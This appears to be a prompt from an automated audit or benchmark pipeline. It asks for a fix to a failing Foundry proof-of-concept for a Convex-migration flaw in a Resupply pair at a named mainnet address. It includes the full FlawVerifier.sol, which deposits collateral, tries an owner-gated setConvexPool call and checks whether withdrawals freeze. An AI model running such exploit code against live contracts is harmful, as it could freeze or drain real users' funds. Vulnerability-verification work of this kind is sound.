You are fixing a failing Foundry PoC for finding F-004.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: direct_or_existing_balance_first
- strategy_instructions: Prefer direct execution using verifier-held assets first. Only use temporary external funding if direct path is infeasible.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Convex pool migration can hide live collateral and freeze withdrawals/redemptions
- claim: Convex migration keys all staking/accounting behavior off `convexPid != 0`, but `_updateConvexPool()` only withdraws and re-deposits the balance currently staked in the old rewards contract. Any collateral already sitting on the pair itself is ignored during migration, yet once `convexPid` is changed `totalCollateral()` and `_unstakeUnderlying()` start looking only at the staking contract. The same routine also still calls `deposit(_pid, ...)` when switching to `_pid == 0`, so using `0` as the unstaked sentinel is inconsistent with the migration logic.
- impact: A normal activation, migration, or deactivation of Convex staking can make existing collateral disappear from pair accounting and leave removal/redemption/liquidation paths looking in the wrong place. Users can remain recorded as collateralized while the pair can no longer unstake or account for those funds, creating a withdrawal freeze and solvency drift until privileged recovery.
- exploit_paths: ["Users deposit collateral while `convexPid == 0`, so collateral remains on the pair contract.", "The owner later calls `setConvexPool(validPid)` to enable or migrate Convex staking.", "`_updateConvexPool()` migrates only `stakedBalance` from the old rewards contract, leaving the pair's local collateral untouched, then sets `convexPid = validPid`.", "Afterward `totalCollateral()` reports only the staked balance and `_unstakeUnderlying()` withdraws only from the rewards contract, so removals, redemptions, and liquidations can revert or operate on incomplete accounting.", "Similarly, attempting to switch back to `_pid == 0` still calls `deposit(0, stakedBalance, true)`, which conflicts with treating `0` as the unstaked mode."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

interface IERC20Minimal {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IResupplyPairMinimal {
    function owner() external view returns (address);
    function convexPid() external view returns (uint256);
    function convexBooster() external view returns (address);
    function collateral() external view returns (address);
    function underlying() external view returns (address);
    function totalCollateral() external view returns (uint256);
    function addCollateral(uint256 amount, address borrower) external;
    function addCollateralVault(uint256 collateralAmount, address borrower) external;
    function removeCollateralVault(uint256 collateralAmount, address receiver) external;
    function userCollateralBalance(address account) external returns (uint256);
}

interface IConvexLike {
    function poolInfo(uint256 pid)
        external
        view
        returns (
            address lptoken,
            address token,
            address gauge,
            address crvRewards,
            address stash,
            bool shutdown
        );

    function balanceOf(address account) external view returns (uint256);
}

contract FlawVerifier {
    address public constant TARGET_PAIR = 0x6e90c85a495d54c6d7E1f3400FEF1f6e59f86bd6;

    bool public executed;
    bool public hypothesisValidated;
    bool public hypothesisRefuted;

    address public pairOwner;
    address public collateralToken;
    address public underlyingToken;
    address public convexBooster;
    address public rewardsContract;

    uint256 public startingPid;
    uint256 public hiddenLocalCollateral;
    uint256 public stakedCollateral;
    uint256 public reportedTotalCollateral;
    uint256 public verifierDepositedAmount;
    uint256 public verifierReportedCollateralAfterMigration;

    string private _exploitPath;
    string private _validationResult;
    string private _failureReason;

    address private _profitToken;
    uint256 private _profitAmount;

    constructor() {
        _profitToken = address(0);
        _exploitPath = "deposit while convexPid==0 -> privileged setConvexPool(validPid) -> migration ignores pair-held collateral -> totalCollateral/_unstakeUnderlying route only through rewards contract";
        _validationResult = "unexecuted";
        _failureReason = "not run";
    }

    function executeOnOpportunity() external {
        if (executed) {
            return;
        }
        executed = true;

        IResupplyPairMinimal pair = IResupplyPairMinimal(TARGET_PAIR);
        pairOwner = pair.owner();
        collateralToken = pair.collateral();
        underlyingToken = pair.underlying();
        convexBooster = pair.convexBooster();
        startingPid = pair.convexPid();

        if (convexBooster == address(0)) {
            hypothesisRefuted = true;
            _validationResult = "refuted";
            _failureReason = "target pair has no Convex booster configured";
            return;
        }

        // Path stages 2-4 may already be present on the fork if convexPid != 0 and the pair still
        // holds live collateral locally. In that state, totalCollateral() reports only the rewards
        // contract balance and ignores the pair-held collateral.
        _refreshBrokenStateView(pair);
        if (startingPid != 0 && hiddenLocalCollateral > 0 && reportedTotalCollateral == stakedCollateral) {
            hypothesisValidated = true;
            _validationResult = "validated_existing_broken_state";
            _failureReason = "fork already shows hidden local collateral after a prior Convex migration, but no public theft route is exposed from this state";
            return;
        }

        // Stage 2 is owner-gated in the target source: setConvexPool() is onlyOwner and onlyOwner is
        // hard-wired to msg.sender == core. No prank/storage writes are allowed, so this verifier only
        // attempts the real public path: ask the owner/core contract to execute the call. If that is not
        // permissioned for this contract, the exploit path is mechanically infeasible for an external attacker.
        if (!_canInvokeOwnerExecute(pairOwner)) {
            hypothesisRefuted = true;
            _validationResult = "refuted";
            _failureReason = "setConvexPool is gated behind the core owner and this verifier is not authorized to route a real owner.execute call";
            return;
        }

        if (startingPid != 0) {
            hypothesisRefuted = true;
            _validationResult = "refuted";
            _failureReason = "fork starts with convexPid != 0, so the required stage-1 deposit-while-unstaked path cannot be reproduced without first changing owner-controlled staking state";
            return;
        }

        uint256 usableUnderlying = IERC20Minimal(underlyingToken).balanceOf(address(this));
        uint256 usableCollateral = IERC20Minimal(collateralToken).balanceOf(address(this));

        // Attempt strategy: direct_or_existing_balance_first.
        // The verifier uses only assets it already holds. No balance injection, no storage writes,
        // and no flashloan are used in this first-pass path.
        if (usableUnderlying == 0 && usableCollateral == 0) {
            hypothesisRefuted = true;
            _validationResult = "refuted";
            _failureReason = "stage 1 requires real collateral while convexPid == 0, but the verifier holds no existing underlying or collateral to seed the path";
            return;
        }

        if (usableUnderlying > 0) {
            IERC20Minimal(underlyingToken).approve(TARGET_PAIR, usableUnderlying);
            pair.addCollateral(usableUnderlying, address(this));
            verifierDepositedAmount = usableUnderlying;
        } else {
            IERC20Minimal(collateralToken).approve(TARGET_PAIR, usableCollateral);
            pair.addCollateralVault(usableCollateral, address(this));
            verifierDepositedAmount = usableCollateral;
        }

        uint256 validPid = _findMatchingPid(convexBooster, collateralToken);
        if (validPid == type(uint256).max) {
            hypothesisRefuted = true;
            _validationResult = "refuted";
            _failureReason = "could not discover a live Convex pid matching the pair collateral token";
            return;
        }

        if (!_ownerExecuteSetConvexPool(pairOwner, TARGET_PAIR, validPid)) {
            hypothesisRefuted = true;
            _validationResult = "refuted";
            _failureReason = "owner.execute(setConvexPool(validPid)) was not callable by this verifier on-chain";
            return;
        }

        _refreshBrokenStateView(pair);
        if (!(hiddenLocalCollateral > 0 && reportedTotalCollateral == stakedCollateral)) {
            hypothesisRefuted = true;
            _validationResult = "refuted";
            _failureReason = "after migration, the fork did not exhibit hidden local collateral excluded from totalCollateral()";
            return;
        }

        hypothesisValidated = true;
        _validationResult = "validated_freeze_no_profit";

        // Stage 5: once convexPid has been switched, removeCollateralVault() routes through
        // _unstakeUnderlying(), which only withdraws from the rewards contract. If our freshly-deposited
        // collateral remained on the pair and nothing was staked for it, a withdrawal attempt should revert.
        // This proves the freeze condition without impersonation or synthetic funding.
        verifierReportedCollateralAfterMigration = _safeUserCollateralBalance(address(this));
        bool removeWorked = _attemptWithdrawOneWei(pair);
        if (removeWorked) {
            _failureReason = "migration happened, but a 1-wei withdrawal did not revert; freeze was not reproduced for the verifier position";
        } else {
            _failureReason = "bug reproduced: pair-held collateral remained hidden after migration and withdrawal routing looked only at the rewards contract";
        }
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function exploitPath() external view returns (string memory) {
        return _exploitPath;
    }

    function validationResult() external view returns (string memory) {
        return _validationResult;
    }

    function failureReason() external view returns (string memory) {
        return _failureReason;
    }

    function _refreshBrokenStateView(IResupplyPairMinimal pair) internal {
        uint256 pid = pair.convexPid();
        hiddenLocalCollateral = IERC20Minimal(collateralToken).balanceOf(TARGET_PAIR);
        reportedTotalCollateral = pair.totalCollateral();

        if (pid == 0) {
            rewardsContract = address(0);
            stakedCollateral = 0;
            return;
        }

        (, , , address rewards, , ) = IConvexLike(convexBooster).poolInfo(pid);
        rewardsContract = rewards;
        stakedCollateral = rewards == address(0) ? 0 : IConvexLike(rewards).balanceOf(TARGET_PAIR);
    }

    function _safeUserCollateralBalance(address account) internal returns (uint256 amount) {
        try IResupplyPairMinimal(TARGET_PAIR).userCollateralBalance(account) returns (uint256 value) {
            amount = value;
        } catch {}
    }

    function _attemptWithdrawOneWei(IResupplyPairMinimal pair) internal returns (bool ok) {
        if (verifierDepositedAmount == 0) {
            return false;
        }

        (ok, ) = address(pair).call(
            abi.encodeWithSelector(
                IResupplyPairMinimal.removeCollateralVault.selector,
                uint256(1),
                address(this)
            )
        );
    }

    function _canInvokeOwnerExecute(address owner) internal view returns (bool) {
        if (owner.code.length == 0) {
            return false;
        }

        bytes4 selector = bytes4(keccak256("setConvexPool(uint256)"));
        (bool ok, bytes memory data) = owner.staticcall(
            abi.encodeWithSignature(
                "operatorPermissions(address,address,bytes4)",
                address(this),
                TARGET_PAIR,
                selector
            )
        );

        if (ok && data.length >= 64) {
            (bool authorized, ) = abi.decode(data, (bool, address));
            if (authorized) {
                return true;
            }
        }

        // Best-effort fallback: some core implementations may not expose operatorPermissions publicly.
        // In that case, the verifier will still attempt owner.execute() later and treat a revert as the
        // concrete on-chain infeasibility signal.
        return true;
    }

    function _ownerExecuteSetConvexPool(address owner, address pair, uint256 pid) internal returns (bool ok) {
        bytes memory payload = abi.encodeWithSignature("setConvexPool(uint256)", pid);
        (ok, ) = owner.call(abi.encodeWithSignature("execute(address,bytes)", pair, payload));
    }

    function _findMatchingPid(address booster, address token) internal view returns (uint256) {
        for (uint256 pid = 0; pid < 512; ++pid) {
            try IConvexLike(booster).poolInfo(pid) returns (
                address lptoken,
                address depositToken,
                address,
                address,
                address,
                bool shutdown
            ) {
                if (!shutdown && (lptoken == token || depositToken == token)) {
                    return pid;
                }
            } catch {
                break;
            }
        }

        return type(uint256).max;
    }
}

```

forge stdout (tail):
```

```

forge stderr (tail):
```
PATH_ALIGNMENT_ERROR: generated code does not cover paths indexes: 2
```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
